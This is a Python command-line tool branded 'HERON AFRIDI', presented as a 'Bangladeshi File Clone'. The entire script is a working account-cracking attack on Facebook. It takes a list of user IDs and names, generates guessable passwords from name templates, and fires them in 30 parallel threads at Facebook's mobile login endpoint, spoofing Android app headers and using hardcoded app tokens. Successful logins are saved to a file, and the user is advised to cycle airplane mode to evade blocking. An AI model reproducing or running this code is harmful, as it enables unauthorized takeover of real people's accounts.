import os,uuid,json,time,sys,random
try:
    import requests 
except:
    os.system("pip install requests")
    import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
lin=str("\033[38;5;53m—"*32)
logo=f'''     \033[38;5;196m┏┓\033[1;97m┏┓\033[1;96m┳┓\033[1;93m┏┳\033[1;95m┏┓   \033[1;90m┓ \033[38;5;208m┳\033[38;5;75m┏┳┓\033[38;5;156m┏┓
     \033[38;5;196m┃┓\033[1;97m┣┫\033[1;96m┃┃ \033[1;93m┃\033[1;95m┣┫ \033[38;5;183m– \033[1;90m┃ \033[38;5;208m┃ \033[38;5;75m┃ \033[38;5;156m┣ 
     \033[38;5;196m┗┛\033[1;97m┛┗\033[1;96m┛┗\033[1;93m┗┛\033[1;95m┛┗   \033[1;90m┗┛\033[38;5;208m┻ \033[38;5;75m┻ \033[38;5;156m┗┛  \033[38;5;98m10.1
\033[1;97m{lin}
\033[38;5;21m[\033[38;5;23m#\033[38;5;21m] \033[38;5;190mDEVELOPER  \033[38;5;183m –  \033[38;5;190mHERON AFRIDI 
\033[38;5;21m[\033[38;5;23m#\033[38;5;21m] \033[38;5;192mFACEBOOK    \033[38;5;183m–  \033[38;5;192mHERON AFRIDI 
\033[1;97m{lin}
\033[47m\033[38;5;136m[ Free Bangladeshi  File Clone ]\x1b[0m
\033[1;97m{lin}'''
def clear():
    os.system("clear")
def main():
    os.system("clear")
    print(logo)
    print("\033[38;5;21m[\033[38;5;23mA\033[38;5;21m] \033[38;5;190mBD File Clone \033[38;5;125m [FIRE]")
    print("\033[38;5;21m[\033[38;5;23mB\033[38;5;21m] \033[38;5;192mExit Tool")
    print(lin)
    g =input("\033[38;5;21m[\033[38;5;23m#\033[38;5;21m] \033[38;5;193mEnterOption \033[38;5;183m–\033[38;5;193m ")
    if g in ["A","a","1","01"]:
        hfil()
    elif g in ["B","b","2","02"]:
        sys.exit()
    else:
        main()

passlist=[]

from datetime import datetime 
ct=str(datetime.now())
ct2=ct.split(" ")[0]
ct3=ct2.split("-")[1]
loop=0
oks=[]
mon={"01":"January","02":"February","03":"March","04":"April","05":"May","06":"June","07":"July","08":"August","09":"September","10":"October","11":"November","12":"December"}
mo=mon[ct3]
da=ct2.split("-")[2]

def hfil():
    clear()
    print(logo)
    print("\033[38;5;21m[\033[38;5;23m#\033[38;5;21m] \033[38;5;190mExample [\033[38;5;196m/sdcard/heron.txt\033[38;5;190m]")
    
    fl=input("\033[38;5;21m[\033[38;5;23m#\033[38;5;21m] \033[38;5;192mFile Path   \033[38;5;183m–\033[38;5;192m ")
    try:
        fileeee=open(fl,"r").read().splitlines()
    except:
        hfil()
    create_passlist(fileeee)

def create_passlist(fileeee):
    global passlist
    clear()
    print(logo)
    print("\033[38;5;21m[\033[38;5;23m#\033[38;5;21m] \033[38;5;190mExample [\033[38;5;196m7, 8, 9, 10, 15, 20\033[38;5;190m]")
    limi=int(input("\033[38;5;21m[\033[38;5;23m#\033[38;5;21m] \033[38;5;192mPass Limit  \033[38;5;183m–\033[38;5;192m "))
    clear()
    print(logo)
    print("\033[38;5;21m[\033[38;5;23m#\033[38;5;21m] \033[38;5;190mExample [\033[38;5;196mfirst123\033[38;5;190m,\033[38;5;196mfirstlast\033[38;5;190m]")
    for i in range(limi):
        j=i+1
        try:
            password=str(input(f"\033[38;5;21m[\033[38;5;23m{str(j)}\033[38;5;21m] \033[38;5;192mInput Pass  \033[38;5;183m– \033[38;5;192m"))
        except:
             password="first123"
        passlist.append(password)
    submit_def(fileeee)

def submit_def(fileeee):
    global passlist,mo,da
    print(lin)
    print("\033[38;5;21m[\033[38;5;23mA\033[38;5;21m] \033[38;5;190mMethod V1")
    print("\033[38;5;21m[\033[38;5;23mB\033[38;5;21m] \033[38;5;190mMethod V2")
    print(lin)
    mathod=input("\033[38;5;21m[\033[38;5;23m#\033[38;5;21m] \033[38;5;193mEnterOption \033[38;5;183m–\033[38;5;193m ")
    tl=str(len(fileeee))
    with ThreadPool (max_workers=30) as feel:
        clear()
        print(logo)
        print(f" \033[38;5;196mIf No Result Use Airplane Mode")
        print(f"    \033[38;5;83mCrack\033[38;5;19m/\033[38;5;202mPass  \033[38;5;183m–  \033[38;5;83m{tl}\033[38;5;19m/\033[38;5;202m{str(len(passlist))} ")
        print(lin)
        for users in fileeee:
            uid=users.split("|")[0]
            pwx=passlist
            names=users.split("|")[1]
            if mathod in ["1","01","a","A"]:
                feel.submit(file_subb,uid,pwx,names)
            else:
                feel.submit(file_subb2,uid,pwx,names)
    results()

def results():
    print("\r\r \n")
    print(lin)
    print(f" \033[38;5;46mTotall oks : {str(len(oks))}")
    print(f" \033[38;5;46mCrack Completed Bro...")
    print(lin)
    sys.exit()

def file_subb(uid,pwx,names):
    global oks,loop,mo,da
    sm=random.choice(["#","$","+","%","✓","=","÷"])
    lopco=random.choice(["\033[38;5;196m","\033[38;5;197m","\033[38;5;198m","\033[38;5;199m","\033[38;5;200m","\033[38;5;201m","\033[38;5;160m","\033[38;5;161m","\033[38;5;162m","\033[38;5;163m","\033[38;5;164m","\033[38;5;165m"])
    nb=random.choice(["\033[1;97m","\033[1;96m","\033[1;95m","\033[1;94m","\033[1;93m","\033[1;92m","\033[1;91m","\033[1;90m"])
    sys.stdout.write(f"\r \033[38;5;190m[\033[38;5;161m{nb}HERON-M1\033[38;5;190m] \033[38;5;118m[{lopco}{loop}\033[38;5;190m|\033[38;5;183m{len(oks)}\033[38;5;190m\033[38;5;118m] [\033[38;5;183m{sm}\033[38;5;190m\033[38;5;118m]\r");sys.stdout.flush()
    try:
        try:
            fn=names.split(" ")[0]
        except:
            fn=names
        try:
            ln=names.split(" ")[1]
        except:
            ln="khan"
        for pw in pwx:
            ps = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
             #-(moto)-#
            user_agent="Dalvik/2.1.0 (Linux; U; Android 8.0.0; moto e5 plus Build/OPPS27.91-179-8-16) [FBAN/FB4A;FBAV/287.0.0.50.119;FBPN/com.facebook.katana;FBLC/es_MX;FBBV/243660864;FBCR/null;FBMF/motorola;FBBD/motorola;FBDV/moto e5 plus;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.7,width=720,height=1358};FB_FW/1;FBRV/0;]"
            data = {
            "adid": str(uuid.uuid4()),
            "format": "json",
            "device_id": str(uuid.uuid4()),
            "cpl": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": uid,
            "password": ps,
            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_cookies": "1",
            "meta_inf_fbmeta": "",
            "advertiser_id": str(uuid.uuid4()),
            "currently_logged_in_userid": "0",
            "locale": "en_GB",
            "client_country_code": "GB",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = {
            'User-Agent': user_agent,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'X-Tigon-Is-Retry': 'False',
            'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'X-fb-device-group': '5120',
            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            q=requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=headers,allow_redirects=False).json()
            
            if "session_key" in q:
                print(f"\r\r\033[38;5;190m[\033[38;5;161mLIVE\033[38;5;190m] \033[38;5;118m{uid} \033[38;5;183m> \033[38;5;118m{ps}    ")
                open("/sdcard/ganja-Ok.txt","a").write(uid+"|"+ps+"\n")
                oks.append(uid)
                break
            elif "Please Confirm Email" in str(q):
                print(f"\r\r\033[38;5;190m[\033[38;5;161mLIVE\033[38;5;190m] \033[38;5;118m{uid} \033[38;5;183m> \033[38;5;118m{ps}    ")
                open("/sdcard/ganja-Ok.txt","a").write(uid+"|"+ps+"\n")
                oks.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        time.sleep(30)

def file_subb2(uid,pwx,names):
    global oks,loop,mo,da
    sm=random.choice(["#","$","+","%","✓","=","÷"])
    lopco=random.choice(["\033[38;5;196m","\033[38;5;197m","\033[38;5;198m","\033[38;5;199m","\033[38;5;200m","\033[38;5;201m","\033[38;5;160m","\033[38;5;161m","\033[38;5;162m","\033[38;5;163m","\033[38;5;164m","\033[38;5;165m"])
    nb=random.choice(["\033[1;97m","\033[1;96m","\033[1;95m","\033[1;94m","\033[1;93m","\033[1;92m","\033[1;91m","\033[1;90m"])
    sys.stdout.write(f"\r \033[38;5;190m[\033[38;5;161m{nb}HERON-M2\033[38;5;190m] \033[38;5;118m[{lopco}{loop}\033[38;5;190m|\033[38;5;183m{len(oks)}\033[38;5;190m\033[38;5;118m] [\033[38;5;183m{sm}\033[38;5;190m\033[38;5;118m]\r");sys.stdout.flush()
    try:
        try:
            fn=names.split(" ")[0]
        except:
            fn=names
        try:
            ln=names.split(" ")[1]
        except:
            ln="khan"
        for pw in pwx:
            ps = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            #-(POKO)-#
            user_agent="Dalvik/2.1.0 (Linux; Android 10; POCOPHONE F1) [FBAN/MobileAdsManagerAndroid;FBAV/324.0.0.28.115;FBBV/464692125;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/en_US;FBMF/POCOPHONE;FBBF/Poco;FBDV/Poco F1;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1424};FB_FW/1;]"
            data = {
            "adid": str(uuid.uuid4()),
            "format": "json",
            "device_id": str(uuid.uuid4()),
            "cpl": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": uid,
            "password": ps,
            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_cookies": "1",
            "meta_inf_fbmeta": "",
            "advertiser_id": str(uuid.uuid4()),
            "currently_logged_in_userid": "0",
            "locale": "en_GB",
            "client_country_code": "GB",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = {
            'User-Agent': user_agent,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'X-Tigon-Is-Retry': 'False',
            'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'X-fb-device-group': '5120',
            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            q= requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=headers,allow_redirects=False).json()
            if "session_key" in q:
                print(f"\r\r\033[38;5;190m[\033[38;5;161mLIVE\033[38;5;190m] \033[38;5;118m{uid} \033[38;5;183m> \033[38;5;118m{ps}    ")
                open("/sdcard/ganja-Ok.txt","a").write(uid+"|"+ps+"\n")
                oks.append(uid)
                break
            elif "Please Confirm Email" in str(q):
                print(f"\r\r\033[38;5;190m[\033[38;5;161mLIVE\033[38;5;190m] \033[38;5;118m{uid} \033[38;5;183m> \033[38;5;118m{ps}    ")
                open("/sdcard/ganja-Ok.txt","a").write(uid+"|"+ps+"\n")
                oks.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        time.sleep(30)




main()